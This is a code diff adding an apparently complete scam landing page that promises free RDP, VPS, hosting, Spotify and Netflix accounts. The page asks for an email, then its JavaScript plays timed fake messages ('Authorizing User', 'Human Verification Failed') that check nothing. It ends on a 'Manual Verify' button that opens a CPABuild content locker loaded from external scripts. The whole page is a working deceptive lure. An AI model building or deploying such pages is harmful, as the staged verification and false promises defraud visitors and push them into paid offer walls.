@@ -1,0 +1,643 @@
+
+<!DOCTYPE html><head>
+            <!--Give the page a title-->
+            <title>TEST</title>
+            <!--Block Robots from crawling this page-->
+            <meta name="robots" content="noindex">
+            <meta name="description" content="Description">
+            <style type="text/css">
+            
+                /* latin */
+                @font-face {
+                  font-family: 'Luckiest Guy';
+                  font-style: normal;
+                  font-weight: 400;
+                  src: local('Luckiest Guy Regular'), local('LuckiestGuy-Regular'), url(https://d13pxqgp3ixdbh.cloudfront.net/uploads/assets/1596408323b852e5921ab31e8c3a9444aa245f0cc5.woff2) format('woff2');
+                  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+                }
+               * {
+                    -webkit-box-sizing: border-box;
+                    box-sizing: border-box;
+                    user-select: none;
+                }
+                
+                body {
+                    margin: 0;
+                    background-image: url(https://alligatortool.com/img/background.jpg);
+                    font-family: Luckiest Guy, Helvetica Neue, Helvetica, Arial, sans-serif;
+                    background-attachment: fixed;
+                    background-position: center;
+                    background-repeat: no-repeat;
+                    background-size: cover;
+                }
+                
+                img {
+                    vertical-align: middle;
+                    border-style: none;
+                }
+                
+                input {
+                    color: #fff;
+                    background: rgba(0, 0, 0, 0.3);
+                    text-align: center;
+                    font-family: inherit;
+                    font-size: 25px;
+                    text-transform: uppercase;
+                    border-radius: 2px;
+                    border: none;
+                    outline: none;
+                    margin: 0;
+                    padding: .5em;
+                }
+                
+                input,
+                button {
+                    transition: all .3s ease-in-out;
+                    transform: scale(0.95);
+                }
+                
+                input:hover,
+                button:hover {
+                    transform: scale(1);
+                }
+                
+                .content {
+                    display: flex;
+                    position: relative;
+                    width: 100%;
+                    min-height: 100vh;
+                    background: rgba(0,0,0,0.5);
+                    overflow: hidden;
+                    -webkit-animation: fadeIn .5s; /* Safari 4+ */
+                    -moz-animation: fadeIn .5s; /* Fx 5+ */
+                    -o-animation: fadeIn .5s; /* Opera 12+ */
+                    animation: fadeIn .5s; /* IE 10+, Fx 29+ */
+                }
+                
+                .container {
+                    color: #fff;
+                    border: none;
+                    padding: 0;
+                    margin: auto;
+                    position: relative;
+                    /* max-width: 80%; */
+                    text-align: center;
+                }
+                
+                .innerBlock {
+                    background: rgba(0, 0, 0, 0.5);
+                    width: fit-content;
+                    padding: 20px;
+                    border-radius: 4px;
+                    box-shadow: 0 0 8px 0 #000;
+                    margin: auto;
+                    margin-top: 10px;
+                }
+                
+                #error,
+                #secondStep,
+                #finishSecondStep,
+                #finalStep {
+                    display: none;
+                }
+                
+                #finishSecondStep {
+                    width: auto;
+                }
+                
+                #finalStep {
+                    width: 100%;
+                }
+                
+                #error > h2,
+                #finalStep > h1 {
+                    margin: 0;
+                    font-weight: normal;
+                    display: inline-block;
+                }
+                
+                .bounceIn {
+                    -webkit-animation-duration: 1s;
+                    animation-duration: 1s;
+                    -webkit-animation-fill-mode: both;
+                    animation-fill-mode: both;
+                    -webkit-animation-name: bounceIn;
+                    animation-name: bounceIn;
+                }
+                
+                .animDelay-200 {
+                    -webkit-animation-delay: 0.2s;
+                    animation-delay: 0.2s;
+                }
+                
+                .animDelay-400 {
+                    -webkit-animation-delay: 0.4s;
+                    animation-delay: 0.4s;
+                }
+                
+                .animDelay-600 {
+                    -webkit-animation-delay: 0.6s;
+                    animation-delay: 0.6s;
+                }
+                
+                .animDelay-800 {
+                    -webkit-animation-delay: 0.8s;
+                    animation-delay: 0.8s;
+                }
+                
+                .animDelay-1000 {
+                    -webkit-animation-delay: 1s;
+                    animation-delay: 1s;
+                }
+                
+                button {
+                    width: 150px;
+                    height: auto;
+                    padding: .5em;
+                    background: #ff0;
+                    color: #000;
+                    font-size: 25px;
+                    font-family: inherit;
+                    border-radius: 2px;
+                    border: none;
+                    outline: none;
+                    cursor: pointer;
+                }
+                
+                button:hover {
+                    background: #ffc800;
+                }
+                
+                .claim {
+                    width: 100%;
+                }
+                
+                .items {
+                    display: inline-block;
+                }
+                
+                .item {
+                    display: none;
+                    float: none;
+                    width: 300px;
+                    position: relative;
+                    min-height: 1px;
+                    padding-right: 15px;
+                    padding-left: 15px;
+                }
+                
+                .item.active {
+                    display: inline-block;
+                }
+                
+                .item a {
+                    cursor: pointer;
+                    display: flex;
+                    height: 100%;
+                    border: 3px solid transparent;
+                    box-shadow: 0 3px 8px rgba(0,0,0,.15);
+                    overflow: hidden;
+                    border-radius: 0.25rem;
+                    position: relative;
+                }
+                
+                .item a:before {
+                    content: "";
+                    position: absolute;
+                    top: 0;
+                    right: 0;
+                    bottom: 0;
+                    left: 0;
+                    background: rgba(255,255,255,.15);
+                    opacity: 0;
+                    transition: .3s;
+                }
+                
+                .item a:hover::before {
+                    opacity: 1;
+                }
+                
+                .item a img {
+                    vertical-align: middle;
+                    border-style: none;
+                    width: 100%;
+                    border-top-left-radius: calc(0.25rem - 1px);
+                    border-top-right-radius: calc(0.25rem - 1px);
+                    transition: .3s;
+                }
+                
+                .item a:hover img {
+                    -webkit-transform: scale3d(1.05,1.05,1);
+                    transform: scale3d(1.05,1.05,1);
+                }
+                
+                .itemName {
+                    position: absolute;
+                    top: 0;
+                    right: 0;
+                    bottom: 0;
+                    left: 0;
+                }
+                
+                .itemName div {
+                    background: rgba(0,0,0,.3);
+                    position: absolute;
+                    width: 100%;
+                    bottom: 0;
+                    padding: .5rem;
+                }
+                
+                .itemName div h4 {
+                    text-align: center;
+                    text-shadow: 0 0 10px rgba(0,0,0,.5);
+                    margin: 4px;
+                    margin-bottom: 0;
+                    text-transform: uppercase;
+                    font-weight: normal;
+                    font-size: 22px;
+                }
+                
+                .item a[data-rarity=common] {
+                    background: radial-gradient(#b7b7b7,#656565);
+                    border-color: #b7b7b7;
+                }
+                
+                .item a[data-rarity=uncommon] {
+                    background: radial-gradient(#8fff62,#1b511c);
+                    border-color: #8fff62;
+                }
+                
+                .item a[data-rarity=rare] {
+                    background: radial-gradient(#52b6ff,#183c76);
+                    border-color: #52b6ff;
+                }
+                
+                .item a[data-rarity=epic] {
+                    background: radial-gradient(#c36aff,#4a2981);
+                    border-color: #c36aff;
+                }
+                
+                .item a[data-rarity=legendary] {
+                    background: radial-gradient(#ff8b51,#773821);
+                    border-color: #ff8b51;
+                }
+                
+                .selectedItem {
+                    border-color: #ff0 !important;
+                    border-width: 5px;
+                }
+                
+                .arrow {
+                    height: 270px;
+                    width: 20px;
+                    display: inline-table;
+                    padding: 10px;
+                    background: rgba(0, 0, 0, 0.45);
+                    cursor: pointer;
+                    transition: all ease .3s;
+                    border-radius: 4px;
+                }
+                
+                .arrow:hover {
+                    background: rgba(0, 0, 0, 0.65);
+                }
+                
+                .arrow div {
+                    vertical-align: middle;
+                    height:100%;
+                    display:table-cell;
+                }
+                
+                .arrow.left {
+                    float: left;
+                }
+                
+                .arrow.right {
+                    float: right;
+                }
+                
+                .arrow svg {
+                    fill: currentColor;
+                    width: 1em;
+                    height: 1em;
+                    display: inline-block;
+                    font-size: 1.5rem;
+                    transition: all ease 0.3s, fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+                    flex-shrink: 0;
+                    user-select: none;
+                }
+                
+                .arrow:hover svg {
+                    transform: scale(1.55);
+                }
+                
+                .hiddenElement {
+                    display: none;
+                }
+                
+                .success {
+                    color: #09ff00;
+                }
+                
+                .warning {
+                    color: #e7e747;
+                }
+                
+                .error {
+                    color: rgb(255, 77, 77);
+                }
+                
+                .verify {
+                    display: none;
+                    margin-top: 10px;
+                    width: 100%;
+                }
+                
+                @-webkit-keyframes fadeIn {
+                    0%   { opacity: 0; }
+                    100% { opacity: 1; }
+                }
+                
+                @-moz-keyframes fadeIn {
+                    0%   { opacity: 0; }
+                    100% { opacity: 1; }
+                }
+                
+                @-o-keyframes fadeIn {
+                    0%   { opacity: 0; }
+                    100% { opacity: 1; }
+                }
+                
+                @keyframes fadeIn {
+                    0%   { opacity: 0; }
+                    100% { opacity: 1; }
+                }
+                
+                @keyframes bounceIn {
+                    0%, 20%, 40%, 60%, 80%, 100% {
+                        -webkit-animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
+                        animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
+                    }
+                    
+                    0% {
+                        opacity: 0;
+                        -webkit-transform: scale3d(0.3, 0.3, 0.3);
+                        transform: scale3d(0.3, 0.3, 0.3);
+                    }
+                    20% {
+                        -webkit-transform: scale3d(1.1, 1.1, 1.1);
+                        transform: scale3d(1.1, 1.1, 1.1);
+                    }
+                    40% {
+                        -webkit-transform: scale3d(0.9, 0.9, 0.9);
+                        transform: scale3d(0.9, 0.9, 0.9);
+                    }
+                    60% {
+                        opacity: 1;
+                        -webkit-transform: scale3d(1.03, 1.03, 1.03);
+                        transform: scale3d(1.03, 1.03, 1.03);
+                    }
+                    80% {
+                        -webkit-transform: scale3d(0.97, 0.97, 0.97);
+                        transform: scale3d(0.97, 0.97, 0.97);
+                    }
+                    100% {
+                        opacity: 1;
+                        -webkit-transform: scale3d(1, 1, 1);
+                        transform: scale3d(1, 1, 1);
+                    }
+                }
+                
+                @media (max-width: 420px) and (min-height: 320px) {
+                    img {
+                        width: 94%;
+                    }
+                
+                    .item {
+                        width: 225px;
+                    }
+                
+                    .arrow {
+                        height: 198px;
+                    }
+                
+                    .itemName div h4 {
+                        font-size: 18px;
+                    }
+                }
+                
+                @keyframes animateProgress {
+                    0% {
+                        background-position: 1rem 0;
+                    }
+                    
+                    100% {
+                        background-position: 0 0;
+                    }
+                }
+
+            </style>
+        </head><body><div class="content">
+    <div class="container">
+        <img class="logo bounceIn animDelay-200" alt="logo" src="/img/logo.png "/>
+        <div id="error" class="innerBlock bounceIn animDelay-400">
+            <h2>Error: <span class="error"></span></h2>
+        </div>
+        <div id="firstStep" class="innerBlock bounceIn animDelay-400">
+            <input type="text" id="name" maxlength="30" placeholder="Your Email"
+         autocomplete="off" spellcheck="off" />
+            <button id="next">Next >></button>
+        </div>
+        <div id="secondStep" class="innerBlock bounceIn animDelay-400">
+            <div class="arrow left bounceIn animDelay-600">
+                <div>
+                    <svg class="MuiSvgIcon-root MuiPaginationItem-icon" focusable="false" viewBox="0 0 24 24" aria-hidden="true">
+                        <path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"></path>
+                    </svg>
+                </div>
+            </div>
+            <div class="items"></div>
+            <div class="arrow right bounceIn animDelay-600">
+                <div>
+                    <svg class="MuiSvgIcon-root MuiPaginationItem-icon" focusable="false" viewBox="0 0 24 24" aria-hidden="true">
+                        <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"></path>
+                    </svg>
+                </div>
+            </div>
+        </div>
+        <div id="finishSecondStep" class="innerBlock bounceIn animDelay-800">
+            <button class="claim">Claim >></button>
+        </div>
+        <div id="finalStep" class="innerBlock bounceIn animDelay-400">
+            <h1 class="finalMessages"></h1>
+            <button class="verify bounceIn animDelay-400">Manual Verify</button>
+        </div>
+    </div>
+</div>
+
+<div class="hiddenElement"></div>
+<script type="text/javascript">var CPABUILDSETTINGS={"it":1102105,"key":"576ff","construct":true};</script><script src='https://cpbild.co/public/external/locker.js'></script><script src="https://bucket.cpabuild.com/uploads/assets/14859274931dd77b79350953c8e835afaced491210.js"></script><script src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/assets/159640775091fa61d506ec8c69e211d0b2f6326472.js"></script><script type='text/javascript'>const SKINS = [ // Skins Rarity = ['legendary', 'epic', 'rare', 'uncommon', 'common']
+            {
+                name: 'Free RDP',
+                image: '/img/rdp.png',
+                rarity: 'Free RDP'
+            },
+            {
+                name: 'Free VPS',
+                image: '/img/vps.png',
+                rarity: 'Free VPS'
+            },
+            {
+                name: 'Free Hosting',
+                image: '/img/hosting.png',
+                rarity: 'Free Hosting'
+            },
+            {
+                name: 'Free Cloud Storage',
+                image: '/img/cloud.png',
+                rarity: 'Free Cloud Storage'
+            },
+            {
+                name: 'Free Spotify Account',
+                image: '/img/spotify.png',
+                rarity: 'Free Spotify Account'
+            },
+			{
+                name: 'Free Netflix Account',
+                image: '/img/netflix.png',
+                rarity: 'Free Netflix Account'
+            },
+           
+         
+        ];
+
+        const amount = window.innerWidth < 745 ? 1 : window.innerWidth < 1364 ? 2 : 3
+        let display = true;
+
+        SKINS.map((item, index) => {
+            if (index >= amount) display = false; // display first 3 in list
+            document.querySelector('.items').innerHTML += `
+                <div class="item bounceIn animDelay-200 ${display && 'active'}" key="${index}">
+                    <a data-rarity="${item.rarity}">
+                        <img src="${item.image}">
+                        <div class="itemName">
+                            <div>
+                                <h4>${item.name}</h4>
+                            </div>
+                        </div>
+                    </a>
+                </div>
+            `;
+        });
+
+		function addListeners() {
+			document.querySelectorAll('.item a').forEach(item => {
+				item.onclick = () => {
+					if (!item.classList.contains('selectedItem')) {
+						item.classList.add('selectedItem');
+					} else {
+						item.classList.remove('selectedItem');
+					}
+				}
+			});
+		}
+		addListeners();
+
+        document.querySelector('#next').onclick = () => {
+            if (document.querySelector('#name').value.length < 3) {
+                document.querySelector('.error').innerText = 'Please provide a valid name!';
+                document.querySelector('#error').style.display = 'block';
+                return;
+            }
+
+            document.querySelector('#error').style.display = 'none';
+            document.querySelector('#firstStep').style.display = 'none';
+            document.querySelector('#secondStep').style.display = 'block';
+            document.querySelector('#finishSecondStep').style.display = 'block';
+        }
+
+        document.querySelector('.arrow.right').onclick = () => {
+            const activeItems = $('.active');
+            const nextItem = $('.item:not(.active)');
+
+            activeItems[0].classList.remove('active');
+            const previousHTML = activeItems[0].outerHTML;
+            activeItems[0].remove();
+
+            nextItem[0].classList.add('active');
+            $('.hiddenElement')[0].innerHTML = previousHTML;
+            $('.items')[0].append($('.hiddenElement div')[0]);
+			addListeners();
+        }
+
+        document.querySelector('.arrow.left').onclick = () => {
+            const activeItems = $('.active');
+            const veryLeftItem = activeItems[0];
+
+            const veryRightItem = activeItems[activeItems.length - 1];
+            veryRightItem.classList.remove('active');
+
+            let itemIndexToAdd = parseInt(veryLeftItem.getAttribute("key")) - 1;
+            if (itemIndexToAdd < 0) itemIndexToAdd = SKINS.length - 1;
+            
+            let itemToPrepend = $(`div[key=${itemIndexToAdd}]`)[0];
+            itemToPrepend.classList.add("active")
+            let itemToPrependHTML = itemToPrepend.outerHTML;
+            itemToPrepend.remove();
+
+            $(".items").prepend(itemToPrependHTML);
+			addListeners();
+        }
+
+        document.querySelector('.claim').onclick = () => { // Claim Button Onclick
+            document.querySelector('#secondStep').style.display = 'none';
+            document.querySelector('#finishSecondStep').style.display = 'none';
+            document.querySelector('#finalStep').style.display = 'block';
+
+            changeMessages();
+        }
+
+        document.querySelector('.verify').onclick = () => { // Verify Button Onclick
+
+        }
+
+        function changeMessages() {
+            const Text = document.querySelector('.finalMessages');
+            Text.innerText = 'Connecting...';
+
+            setTimeout(() => {
+                Text.innerText = 'Authorizing User...';
+                setTimeout(() => {
+                    Text.innerText = 'Your Email is Valid!';
+                    Text.classList.add('success');
+                    setTimeout(() => {
+                        Text.innerText = 'Verifying Human...';
+                        Text.classList.remove('success');
+                        setTimeout(() => {
+                            Text.innerText = 'Attempting Human Verification (1/2)';
+                            Text.classList.add('warning');
+                            setTimeout(() => {
+                                Text.innerText = 'Human Verification Failed (Skipping)';
+                                Text.classList.remove('warning');
+                                Text.classList.add('error');
+                                setTimeout(() => {
+                                    Text.innerText = 'Attempting Human Verification (2/2)';
+                                    Text.classList.remove('error');
+                                    Text.classList.add('warning');
+                                    setTimeout(() => {
+                                        Text.innerText = 'Human Verification Failed (2/2)';
+                                        Text.classList.remove('warning');
+                                        Text.classList.add('error');
+                                        setTimeout(() => {
+                                            Text.innerText = 'Manual Verification Required';
+                                            document.querySelector('.verify').style.display = 'block';
+											document.querySelector('.verify').onclick = CPABuildLock;
+                                        }, 1500);
+                                    }, 3000);
+                                }, 1500);
+                            }, 2500);
+                        }, 1500);
+                    }, 1500);
+                }, 2000);
+            }, 1500);
+        }</script></body>
